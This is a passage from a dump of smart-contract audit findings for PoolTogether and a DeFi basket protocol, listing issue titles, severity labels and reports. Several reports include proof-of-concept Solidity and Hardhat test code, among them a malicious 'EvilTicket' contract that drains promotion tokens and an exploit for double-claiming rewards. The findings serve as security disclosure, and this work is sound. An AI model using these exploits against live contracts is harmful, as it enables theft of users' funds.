"labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  johnnycash   # Vulnerability details  ## Impact  An attacker can claim its reward 256 * `epochDuration` seconds after the timestamp at which the promotion started. The vulnerability allows him to claim a reward several times to retrieve all the tokens associated to the promotion.    ## Analysis  `claimRewards()` claim rewards for a given promotion and epoch. In order to prevent a user from claiming a reward multiple times, the mapping [_claimedEpochs](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L32) keeps track of claimed rewards per user:  ```     /// @notice Keeps track of claimed rewards per user.     /// @dev _claimedEpochs[promotionId][user] => claimedEpochs     /// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.     mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs; ```  (The comment is wrong, epochs are packed into a uint256 which allows **256** epochs to be stored).  `_epochIds` is an array of `uint256`. For each `_epochId` in this array, `claimRewards()` checks that the reward associated to this `_epochId` isn't already claimed thanks to  `_isClaimedEpoch()`. [_isClaimedEpoch()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L371) checks that the bit `_epochId` of `_claimedEpochs` is unset:  ``` (_userClaimedEpochs >> _epochId) & uint256(1) == 1; ```  However, if `_epochId` is greater than 255, `_isClaimedEpoch()` always returns false. It allows an attacker to claim a reward several times.  [_calculateRewardAmount()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L289) just makes use of `_epochId` to tell whether the promotion is over.   ## Proof of Concept  The following test should result in a reverted transaction, however the transaction succeeds.  ```         it('should fail to claim rewards if one or more epochs have already been claimed', async () => {             const promotionId = 1;              const wallet2Amount = toWei('750');             const wallet3Amount = toWei('250');              await ticket.mint(wallet2.address, wallet2Amount);             await ticket.mint(wallet3.address, wallet3Amount);              await createPromotion(ticket.address);             await increaseTime(epochDuration * 257);              await expect(                 twabRewards.claimRewards(wallet2.address, promotionId, ['256', '256']),             ).to.be.revertedWith('TwabRewards/rewards-already-claimed');         }); ```   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  A possible fix could be to change the type of `_epochId` to `uint8` in:  - `_calculateRewardAmount()` - `_updateClaimedEpoch()` - `_isClaimedEpoch()`  and change the type of `_epochIds` to `uint8[]` in `claimRewards()`.  "}, {"title": "_getPromotion() doesn't revert on invalid _promotionId", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/2", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  johnnycash   # Vulnerability details  ## Impact  `_getPromotion()` doesn't revert if the specified `_promotionId` doesn't exist. It can lead to unexpected behaviors in callers of this function.  For instance, [claimRewards](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L162) will continue its execution and call `_calculateRewardAmount()` and eventually `_promotion.token.safeTransfer()` (probably with `_rewardsAmount` equal to 0).   ## Analysis  In contrary to the following comment:  ``` @dev Will revert if the promotion does not exist. ```  [_getPromotion()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L260-L268) doesn't revert if the specified `_promotionId` doesn't exist, but return a `Promotion` structure with all fields set to 0.   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  Fix suggestion:  ```     function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory _promotion) {         _promotion = _promotions[_promotionId];         require(_promotion.creator != address(0), \"TwabRewards/invalid-promotion\");         return _promotion;     } ```  "}, {"title": "Malicious tickets can lead to the loss of all tokens", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/1", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  johnnycash   # Vulnerability details  ## Impact  It allows an attacker to retrieve all the tokens of each promotions.   ## Analysis  Anyone can create a new promotion using `createPromotion()`. An attacker can create a new malicious promotion with the following parameters:  - the address of a malicious ticket smart contract - the token address from the targeted promotion(s) - optionally, `_numberOfEpochs` equal to 0 to create this promotion for free  The only verification made on the ticket address given by [_requireTicket()](https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the `ITicket` interface.  The attacker can then call `claimRewards()` with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.  1. `_calculateRewardAmount()` is first called to get the reward amount with the following formula `(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween()`. The malicious ticket can return an arbitrary  `_averageBalance` and an `_averageTotalSupplies` of 1, leading to an arbitrary large reward amount. 2. `_promotion.token.safeTransfer(_user, _rewardsAmount)` is called. It transfers the amount of tokens previously computed to the attacker.  The attacker receives the tokens of other promotions without having spent anything.   ## Proof of Concept  The malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol)with the following changes:  ```     /// @inheritdoc ITicket     function getAverageTotalSuppliesBetween(         uint64[] calldata _startTimes,         uint64[] calldata _endTimes     ) external view override returns (uint256[] memory) {         uint256[] memory _balances = new uint256[](1);         _balances[0] = uint256(1);         return _balances;     }      /// @inheritdoc ITicket     function getAverageBalanceBetween(         address _user,         uint64 _startTime,         uint64 _endTime     ) external view override returns (uint256) {         return 1337;     } ```  The test for HardHat is:  ```     describe('exploit()', async () => {         it('this shouldnt happen', async () => {             const promotionIdOne = 1;             const promotionIdTwo = 2;              await expect(createPromotion(ticket.address))                 .to.emit(twabRewards, 'PromotionCreated')                 .withArgs(promotionIdOne);                          let evilTicketFactory = await getContractFactory('EvilTicket');             let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);             let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;             await expect(twabRewards.connect(wallet2).createPromotion(                 evilTicket.address,                 rewardToken.address,                 tokensPerEpoch,                 createPromotionTimestamp,                 1,//epochDuration,                 0,//epochsNumber,             )).to.emit(twabRewards, 'PromotionCreated')               .withArgs(promotionIdTwo);              await increaseTime(100);             const epochIds = ['100'];             await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);         });     }); ```  It results in the following error:  ```  1) TwabRewards        exploit()          this shouldnt happen:      Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'       at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)       at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)       at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)       at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)       at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)       at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186) ```   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  Maybe add a whitelist of trusted tickets?  "}, {"title": "Use of deprecated `safeApprove()` function", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/177", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Use of deprecated `safeApprove()` function"}, {"title": "Reentrancy vulnerability in `Basket` contract's `initialize()` method.", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  broccolirob   # Vulnerability details   A malicious \"publisher\" can create a basket proposal that mixes real ERC20 tokens with a malicious ERC20 token containing a reentrancy callback in it's `approve()` method. When the `initialize()` method is called on the newly cloned `Basket` contract, a method called `approveUnderlying(address(auction))` is called, which would trigger the reentrancy, call `initialize()` again, passing in altered critical values such as `auction` and `factory`, and then removes its self from `proposal.tokens` and `proposal.weights` so it doesn't appear in the token list to basket users.  https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L44-L61  ## Impact `Auction` and `Factory` can be set to custom implementations that do malicious things. Since all baskets and auctions are clones with their own addresses, this fact would be difficult for users to detect. `Auction` controls ibRatio, which a malicious version could send back a manipulated value to `Basket`, allowing the malicious \"publisher\" to burn basket tokens till all users underlying tokens are drained.  ## Tools Used Manual review and Hardhat.  ## Recommended Mitigation Steps Since `Basket` inherits from `ERC20Upgradeable` the `initializer` modifier should be available and therefore used here. It has an `inititializing` variable that would prevent this kind of reentrancy attack.  "}, {"title": "Basket:handleFees(): fees are overcharged", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Basket:handleFees(): fees are overcharged"}, {"title": "Auction:bondBurn(): cache bondAmount", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/167", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Auction:bondBurn(): cache bondAmount"}, {"title": "Auction:bondForRebalance() store calculation of bondAmount in local variable", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/166", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Auction:bondForRebalance() store calculation of bondAmount in local variable"}, {"title": "Check for tokenAmount > 0 is missing in pushUnderlying function [basket.sol]", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/165", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Check for tokenAmount > 0 is missing in pushUnderlying function [basket.sol]"}, {"title": "Auction:settleAuction() cache address(basket)", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/164", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Auction:settleAuction() cache address(basket)"}, {"title": "Function changePublisher, changeLicenseFee, and setNewMaxSupply  can be refactored for efficiency and clarity", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/162", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Function changePublisher, changeLicenseFee, and setNewMaxSupply  can be refactored for efficiency and clarity"}, {"title": "Function handleFees #L148-L151 and updateIBRatio (Basket.sol) can be refactored for efficiency and clarity", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/161", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Function handleFees #L148-L151 and updateIBRatio (Basket.sol) can be refactored for efficiency and clarity"}, {"title": "Open TODOs", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/157", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Open TODOs"}, {"title": "Missing cap on LicenseFee", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Missing cap on LicenseFee"}, {"title": "Fee calculation is slightly off", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Fee calculation is slightly off"}, {"title": "Factory can block auctions", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/150", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Factory can block auctions"}, {"title": "Division with `BASE` twice can be optimized ", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/147", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Division with `BASE` twice can be optimized "}, {"title": "`maxSupply` can be exceeded", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/146", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "`maxSupply` can be exceeded"}, {"title": "Change in `auctionMultiplier/auctionDecrement` change profitability of auctions and factory can steal all tokens from a basket abusing it", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  0x0x0x   # Vulnerability details  When factory changes `auctionMultiplier` or `auctionDecrement` profitability of bonded auctions change. There is no protection against this behaviour. Furthermore, factory owners can decide to get all tokens from baskets where they are bonded for the auction.  ## Proof of concept  1- Factory owners call `bondForRebalance` for an auction.  2- Factory owners sets `auctionMultiplier` as 0 and `auctionDecrement` as maximum value  3- `settleAuction` is called. `newRatio = 0`, since `a = b = 0`. All tokens can be withdrawn with this call, since `tokensNeeded = 0`.  ## Extra notes  Furthermore, even the factory owners does not try to scam users. In case `auctionMultiplier` or `auctionDecrement` is changed, all current `auctionBonder` from `Auctions` can only call `settleAuction` with different constraints. Because of different constraints, users/bonder will lose/gain funds.  ## Mitigation step  Save `auctionDecrement` and `auctionMultiplier` to global variables in `Auction.sol`, when `startAuction` is called.  "}, {"title": "`Basket.sol#auctionBurn` calculates `ibRatio` wrong", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  0x0x0x   # Vulnerability details  The function is implemented as follows:  ``` function auctionBurn(uint256 amount) onlyAuction nonReentrant external override {         uint256 startSupply = totalSupply();         handleFees(startSupply);         _burn(msg.sender, amount);          uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);         ibRatio = newIbRatio;          emit NewIBRatio(newIbRatio);         emit Burned(msg.sender, amount);     } ```  When `handleFees` is called, `totalSupply` and `ibRatio` changes accordingly, but for `newIbRatio` calculation tokens minted in `handleFees` is not included. Therefore, `ibRatio` is calculated higher than it should be. This is dangerous, since last withdrawing user(s) lose their funds with this operation. In case this miscalculation happens more than once, `newIbRatio` will increase the miscalculation even faster and can result in serious amount of funds missing. At each time `auctionBurn` is called, at least 1 day (auction duration) of fees result in this miscalculation. Furthermore, all critical logic of this contract is based on `ibRatio`, this behaviour can create serious miscalculations.   ## Mitigation step  Rather than  `uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);`  A practical solution to this problem is calculating `newIbRatio` as follows:  ``` uint256 supply = totalSupply(); uint256 newIbRatio = ibRatio * (supply + amount) / supply; ```  "}, {"title": "`mintTo` has not an extra require statement", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/142", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`mintTo` has not an extra require statement"}, {"title": "Loops can be implemented more efficiently", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/140", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Loops can be implemented more efficiently"}, {"title": "For uint `> 0` can be replaced with ` != 0` for gas optimization", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/139", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  0x0x0x   # Vulnerability details  ## Impact  `!= 0` is a cheaper operation compared to `> 0`, when dealing with `uint`.  ## Occurrences  ```  ./Timeswap-V1-Convenience/contracts/base/ERC721.sol:147:            } else if (_return.length > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:65:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:128:        if (year >= 1970 && month > 0 && month <= 12) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:130:            if (day > 0 && day <= daysInMonth) { ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:296:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:455:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:614:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Pay.sol:86:        if (collateralOut > 0) { ./Timeswap-V1-Convenience/contracts/libraries/PayMath.sol:27:                if (due.debt > 0) { ./Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol:21:        if (z % y > 0) z++; ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:58:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:75:        if (params.claimsIn.bond > 0) ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:77:        if (params.claimsIn.insurance > 0) ./Timeswap-V1-Core/contracts/TimeswapPair.sol:153:        require(xIncrease > 0 && yIncrease > 0 && zIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:170:        require(liquidityOut > 0, 'E212'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:203:        require(liquidityIn > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:217:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:218:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:236:        require(xIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:239:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:274:        require(claimsIn.bond > 0 || claimsIn.insurance > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:292:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:293:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:311:        require(xDecrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:314:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:369:        if (assetIn > 0) Callback.pay(asset, assetIn, data); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:374:        if (collateralOut > 0) collateral.safeTransfer(to, collateralOut); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:34:                require(denominator > 0); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:124:        if (mulmod(a, b, denominator) > 0) result++; ./Timeswap-V1-Core/contracts/libraries/Math.sol:7:        if (x % y > 0) z++;  ```  "}, {"title": "Use negate(!) rather than `== false`", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/138", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Use negate(!) rather than `== false`"}, {"title": "Extra payments for an auction gets stucks", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/137", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Extra payments for an auction gets stucks"}, {"title": "TODO comments should be resolved ", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/135", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "TODO comments should be resolved "}, {"title": "`BasketLicenseProposed` better emit proposal id", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/134", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Since tokenName is user supplied and can be duplicated, it is better to emit proposal id instead.  https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Factory.sol#L91 ```         emit BasketLicenseProposed(msg.sender, tokenName); ```  "}, {"title": "Gas Optimization: Use calldata instead of memory", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/130", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Gas Optimization: Use calldata instead of memory"}, {"title": "Gas Optimization: Reorder storage layout", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/129", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Gas Optimization: Reorder storage layout"}, {"title": "`Auction.sol#initialize()` Use msg.sender rather than factory_ parameter can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/126", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`Auction.sol#initialize()` Use msg.sender rather than factory_ parameter can save gas"}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/123", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Adding unchecked directive can save gas"}, {"title": "Cache external call results can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/122", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Cache external call results can save gas"}, {"title": "Unnecessary checked arithmetic in for loops", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/121", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Unnecessary checked arithmetic in for loops"}, {"title": "`++i` is more efficient than `i++`", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/120", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`++i` is more efficient than `i++`"}, {"title": "`validateWeights()` Limit loop to a meaningful bound can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/118", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`validateWeights()` Limit loop to a meaningful bound can save gas"}, {"title": "Use free functions to replace external calls can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/117", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Use free functions to replace external calls can save gas"}, {"title": "`NewIndexSubmitted` event is not emitted in some case", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/115", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "`NewIndexSubmitted` event is not emitted in some case"}, {"title": "Useless imports", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/113", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Useless imports"}, {"title": "Critical operations should emit events", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/112", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Critical operations should emit events"}, {"title": "`Factory.sol` Lack of two-step procedure and/or input validation routines for critical operations leaves them error-prone", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/111", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "`Factory.sol` Lack of two-step procedure and/or input validation routines for critical operations leaves them error-prone"}, {"title": "`Basket.sol#handleFees()` Check if `timeDiff > 0` can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/110", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`Basket.sol#handleFees()` Check if `timeDiff > 0` can save gas"}, {"title": "`Auction.sol#auctionOngoing` Switching between 1, 2 instead of true, false is more gas efficient", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/107", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`Auction.sol#auctionOngoing` Switching between 1, 2 instead of true, false is more gas efficient"}, {"title": "`Auction.sol#settleAuction()` Bonder may not be able to settle a bonded auction, leading to loss of funds", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L97-L102  ```solidity=97     uint256 a = factory.auctionMultiplier() * basket.ibRatio();     uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();     uint256 newRatio = a - b;      (address[] memory pendingTokens, uint256[] memory pendingWeights, uint256 minIbRatio) = basket.getPendingWeights();     require(newRatio >= minIbRatio); ```  In the current implementation, `newRatio` is calculated and compared with `minIbRatio` in `settleAuction()`.  However, if `newRatio` is less than `minIbRatio`, `settleAuction()` will always fail and there is no way for the bonder to cancel and get a refund.  ### PoC  Given:  - `bondPercentDiv` = 400 - `basketToken.totalSupply` = 40,000 - `factory.auctionMultiplier` = 2 - `factory.auctionDecrement` = 10,000 - `basket.ibRatio` = 1e18 - p`endingWeights.minIbRatio` = 1.9 * 1e18  1. Alice called `bondForRebalance()` `2,000` blocks after the auction started, paid `100` basketToken for the bond; 2. Alice tries to `settleAuction()`, it will always fail because `newRatio < minIbRatio`; - a = 2 * 1e18 - b = 0.2 * 1e18 - newRatio = 1.8 * 1e18; 3. Bob calls `bondBurn()` one day after, `100` basketToken from Alice will been burned.  ### Recommendation  Move the `minIbRatio` check to `bondForRebalance()`:  ```solidity=58 function bondForRebalance() public override {         require(auctionOngoing);         require(!hasBonded);          bondTimestamp = block.timestamp;         bondBlock = block.number;          uint256 a = factory.auctionMultiplier() * basket.ibRatio();         uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();         uint256 newRatio = a - b;          (address[] memory pendingTokens, uint256[] memory pendingWeights, uint256 minIbRatio) = basket.getPendingWeights();         require(newRatio >= minIbRatio);          IERC20 basketToken = IERC20(address(basket));         bondAmount = basketToken.totalSupply() / factory.bondPercentDiv();         basketToken.safeTransferFrom(msg.sender, address(this), bondAmount);         hasBonded = true;         auctionBonder = msg.sender;          emit Bonded(msg.sender, bondAmount);     } ```  "}, {"title": "`Basket.sol` should use the Upgradeable variant of OpenZeppelin Contracts", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/104", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "`Basket.sol` should use the Upgradeable variant of OpenZeppelin Contracts"}, {"title": "`Basket.sol` Pending licenseFee may unable to be canceled when current licenseFee is `0`", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/103", "labels": ["bug", "1 (Low Risk)"], "target": "2021-12-defiprotocol-findings", "body": "`Basket.sol` Pending licenseFee may unable to be canceled when current licenseFee is `0`"}, {"title": "`Basket.sol#approveUnderlying()` Cache and read storage variables from the stack can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/100", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`Basket.sol#approveUnderlying()` Cache and read storage variables from the stack can save gas"}, {"title": "`Basket.sol#changeLicenseFee()` Unable to set `licenseFee` to 0", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/97", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "`Basket.sol#changeLicenseFee()` Unable to set `licenseFee` to 0"}, {"title": "Missing error messages in require statements", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/93", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Missing error messages in require statements"}, {"title": "`Basket.sol#initialize()` Remove redundant assertion can save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/92", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`Basket.sol#initialize()` Remove redundant assertion can save gas"}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/91", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Unused imports"}, {"title": "Outdated compiler version", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/90", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Outdated compiler version"}, {"title": "Broken unit tests due to incorrect values", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/88", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Broken unit tests due to incorrect values"}, {"title": "Avoid Initialization of Loop Index If It Is 0 to Save Gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/84", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Avoid Initialization of Loop Index If It Is 0 to Save Gas"}, {"title": "setAuctionDecrement() Lack of Input Validation May Break Other Function", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/83", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "setAuctionDecrement() Lack of 